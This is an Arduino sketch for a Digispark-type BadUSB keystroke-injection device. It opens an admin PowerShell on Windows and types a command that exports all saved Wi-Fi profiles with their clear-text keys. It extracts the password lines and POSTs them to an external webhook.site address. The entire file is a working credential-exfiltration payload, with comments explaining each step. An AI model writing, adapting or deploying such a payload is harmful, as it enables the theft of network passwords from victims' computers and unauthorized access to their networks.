#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.delay(500);
  // windows + x to open a secret menu to open commands
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  // key A, will open the option "WindowsPowerShell (Admin)"
  DigiKeyboard.sendKeyStroke(KEY_A);

  // then press Alt + Y, which will pick the option to process with admin perms
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ALT, KEY_Y);

  DigiKeyboard.print("cd ~; netsh wlan export profile key=clear; Get-Content -Path .\Wi*.xml | Out-File -FilePath Output.txt; Select-String -Path Output.txt -Pattern 'keyMaterial' > Wi-Fi-PASS.txt; Invoke-WebRequest -Uri https://webhook.site/f2f258c1-39c2-45ef-b615-16c8829f37c4 -Method POST -InFile Wi-Fi-PASS.txt; exit");
  // enter to send command
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // now the whole script will run and send the wifi passwords to specified web address.
  for(;;){ /*empty*/ }
}
